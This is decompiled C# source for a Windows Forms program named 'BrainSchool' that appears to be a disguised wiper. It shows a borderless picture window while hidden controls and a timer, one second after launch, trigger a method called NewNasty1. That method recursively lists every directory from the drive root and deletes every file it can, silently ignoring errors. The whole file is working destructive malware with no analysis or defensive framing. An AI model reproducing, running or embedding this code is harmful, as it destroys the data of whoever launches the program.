using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BrainSchool;

public class Form1 : Form
{
	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("oTv")]
	private TreeView _oTv;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("timTimer")]
	private Timer _timTimer;

	[AccessedThroughProperty("ListBox2")]
	private ListBox _ListBox2;

	private IContainer components;

	private Collection collNodeKeys;

	private string strInitialDirectory;

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_PictureBox1 == null)
			{
			}
			_PictureBox1 = value;
			if (_PictureBox1 != null)
			{
			}
		}
	}

	internal virtual ListBox ListBox2
	{
		get
		{
			return _ListBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ListBox2 == null)
			{
			}
			_ListBox2 = value;
			if (_ListBox2 != null)
			{
			}
		}
	}

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ListBox1 == null)
			{
			}
			_ListBox1 = value;
			if (_ListBox1 != null)
			{
			}
		}
	}

	internal virtual TreeView oTv
	{
		get
		{
			return _oTv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_oTv == null)
			{
			}
			_oTv = value;
			if (_oTv != null)
			{
			}
		}
	}

	internal virtual Timer timTimer
	{
		get
		{
			return _timTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_timTimer != null)
			{
				_timTimer.remove_Tick((EventHandler)timTimer_Tick);
			}
			_timTimer = value;
			if (_timTimer != null)
			{
				_timTimer.add_Tick((EventHandler)timTimer_Tick);
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Form1());
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		components = new Container();
		ResourceManager resourceManager = new ResourceManager(typeof(Form1));
		PictureBox1 = new PictureBox();
		ListBox2 = new ListBox();
		ListBox1 = new ListBox();
		oTv = new TreeView();
		timTimer = new Timer(components);
		((Control)this).SuspendLayout();
		PictureBox1.set_Image((Image)resourceManager.GetObject("PictureBox1.Image"));
		PictureBox pictureBox = PictureBox1;
		Point location = new Point(0, 0);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		Size size = new Size(504, 384);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		((Control)ListBox2).set_Font(new Font("Tahoma", 6f));
		ListBox2.set_ItemHeight(10);
		ListBox listBox = ListBox2;
		location = new Point(232, 227);
		((Control)listBox).set_Location(location);
		((Control)ListBox2).set_Name("ListBox2");
		ListBox listBox2 = ListBox2;
		size = new Size(26, 24);
		((Control)listBox2).set_Size(size);
		((Control)ListBox2).set_TabIndex(3);
		((Control)ListBox2).set_Visible(false);
		((Control)ListBox1).set_Font(new Font("Tahoma", 6f));
		ListBox1.set_ItemHeight(10);
		ListBox listBox3 = ListBox1;
		location = new Point(242, 133);
		((Control)listBox3).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox4 = ListBox1;
		size = new Size(28, 24);
		((Control)listBox4).set_Size(size);
		((Control)ListBox1).set_TabIndex(4);
		((Control)ListBox1).set_Visible(false);
		oTv.set_ImageIndex(-1);
		TreeView obj = oTv;
		location = new Point(243, 185);
		((Control)obj).set_Location(location);
		((Control)oTv).set_Name("oTv");
		oTv.set_SelectedImageIndex(-1);
		TreeView obj2 = oTv;
		size = new Size(16, 14);
		((Control)obj2).set_Size(size);
		((Control)oTv).set_TabIndex(6);
		((Control)oTv).set_Visible(false);
		timTimer.set_Interval(1000);
		size = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(size);
		size = new Size(501, 384);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)oTv);
		((Control)this).get_Controls().Add((Control)(object)ListBox2);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		timTimer.set_Enabled(true);
	}

	private void NewNasty1()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		timTimer.set_Enabled(false);
		collNodeKeys = new Collection();
		strInitialDirectory = "\\";
		oTv.get_Nodes().Clear();
		TreeNode val = oTv.get_Nodes().Add(strInitialDirectory);
		ListBox1.get_Items().Add((object)strInitialDirectory);
		TreeNode val2 = val;
		val2.set_Tag((object)strInitialDirectory);
		val2.set_ImageIndex(0);
		val2.set_SelectedImageIndex(0);
		val2 = null;
		try
		{
			collNodeKeys.Add((object)val, strInitialDirectory, (object)null, (object)null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		FillChild(strInitialDirectory);
		checked
		{
			int num = ListBox1.get_Items().get_Count() - 1;
			for (int i = 0; i <= num; i++)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(StringType.FromObject(ListBox1.get_Items().get_Item(i)));
				FileInfo[] files = directoryInfo.GetFiles();
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					try
					{
						File.Delete(StringType.FromObject(ObjectType.StrCatObj(ObjectType.StrCatObj(ListBox1.get_Items().get_Item(i), (object)"\\"), (object)fileInfo.get_Name())));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	private void FillChild(string dir)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		try
		{
			string[] directories = Directory.GetDirectories(dir);
			string[] array = directories;
			foreach (string text in array)
			{
				TreeNode val = (TreeNode)collNodeKeys.get_Item((object)dir);
				TreeNode val2 = val.get_Nodes().Add(Strings.Mid(text, checked(Strings.Len(dir) + 2), Strings.Len(text)));
				TreeNode val3 = val2;
				val3.set_Tag((object)text);
				val3.set_ImageIndex(1);
				val3.set_SelectedImageIndex(1);
				val3 = null;
				ListBox1.get_Items().Add((object)text);
				collNodeKeys.Add((object)val2, text, (object)null, (object)null);
				FillChild(text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void timTimer_Tick(object sender, EventArgs e)
	{
		NewNasty1();
	}
}
